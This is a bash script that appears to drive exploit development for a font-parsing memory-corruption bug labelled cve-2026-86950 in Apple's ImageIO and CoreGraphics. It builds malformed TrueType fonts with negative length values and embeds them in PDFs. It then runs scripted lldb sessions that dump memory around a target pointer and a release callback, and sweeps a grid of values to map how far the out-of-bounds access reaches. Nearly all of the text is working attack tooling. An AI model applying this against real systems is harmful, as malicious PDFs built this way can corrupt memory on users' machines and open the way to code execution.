#!/bin/bash
# RIP-2: negative-L reach grid (dp slot @ -0x110000 => L=-17408) + provider struct
# control dump. Sessions: D (L=64 control) + C (L=-17408). Plain grid below.
set -x
cd detonation/cve-2026-86950
clang -O2 -g -o render2 render2.c -framework ImageIO -framework CoreGraphics -framework CoreFoundation || exit 8
clang -O2 -g -o render4 render4.c -framework ImageIO -framework CoreGraphics -framework CoreFoundation || exit 9
[ -x venv/bin/python ] || python3 -m venv venv
./venv/bin/pip -q install fonttools
./venv/bin/python - << 'PYB'
import sys; sys.path.insert(0, '.')
from gen_k2 import build_font
for L in (64, -17408, -256):
    build_font(f"k2_m{L}.ttf", L)
print("fonts built")
PYB
for L in 64 -17408 -256; do ./venv/bin/python gen_pdf.py k2_m${L}.pdf k2_m${L}.ttf; done

dump_lines () {
  for o in 0x110000 0x10fc00 0x10f000 0x110400 0x111000; do
    echo "memory read --size 8 --count 64 --format x \$x27-$o"
  done
}
# session D: control L=64
{
  echo "breakpoint set -n aa_cache_render"
  echo "process launch -- k2_m64.pdf d.png"
  echo "breakpoint delete 1"
  echo "breakpoint set -a \$pc+1804"
  echo "continue"
  echo "register read x27 x22"
  dump_lines
  echo "breakpoint delete 2"
  echo "breakpoint set -n rel_cb"
  echo "continue"
  echo "register read x0 x1 x2 lr"
  echo "quit"
} > cmdsD.txt
lldb -b -s cmdsD.txt ./render4 > sessD.txt 2>&1 || true

# session C: strike L=-17408
{
  echo "breakpoint set -n aa_cache_render"
  echo "process launch -- k2_m-17408.pdf c.png"
  echo "breakpoint delete 1"
  echo "breakpoint set -a \$pc+1804"
  echo "continue"
  echo "register read x27 x22"
  dump_lines
  echo "breakpoint delete 2"
  echo "breakpoint set -n rel_cb"
  echo "continue"
  echo "bt"
  echo "register read x27 pc lr"
  echo "quit"
} > cmdsC.txt
lldb -b -s cmdsC.txt ./render4 > sessC.txt 2>&1 || true

# plain grid: negative-L survivors + rc + struct words
./venv/bin/python - << 'PYG'
import subprocess, os, sys, re
sys.path.insert(0, '.')
from gen_k2 import build_font
Ls = [-256, -1024, -2048, -4096, -8192] + list(range(-27648, -6143, 1024))
for L in Ls:
    ttf=f"k2_g{L}.ttf"; pdf=f"k2_g{L}.pdf"
    try:
        build_font(ttf, L)
        subprocess.run(['./venv/bin/python','gen_pdf.py',pdf,ttf], check=True,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        r = subprocess.run(['./render4', pdf, 'g.png'], capture_output=True, timeout=120)
        err = r.stderr.decode(errors='replace')
        dp = re.search(r'PROBE2 dp (0x[0-9a-f]+) words: (.*)', err)
        pre = re.search(r'PROBE6 dp-prerel (0x[0-9a-f]+) words: (.*)', err)
        rel = 'REL_CB fired' in err
        done = 'PHASE done' in err
        dd  = dp.group(2)[:110] if dp else '-'
        pp  = pre.group(2)[:110] if pre else '-'
        print("L=%d rc=%d rel=%s done=%s" % (L, r.returncode, rel, done))
        print("   dp : %s" % dd)
        print("   pre: %s" % pp)
    except Exception as e:
        print("L=%d EXC %s" % (L, str(e)[:80]))
print("GRID DONE")
PYG

cd ../..
mkdir -p findings
cp detonation/cve-2026-86950/{sessC.txt,sessD.txt,cmdsC.txt,cmdsD.txt} findings/ 2>/dev/null
cp detonation/cve-2026-86950/{c.png,d.png} findings/ 2>/dev/null
ls findings/ | wc -l
grep -E "x27 =|REL_CB|EXC|frame #" detonation/cve-2026-86950/sessC.txt | head -12
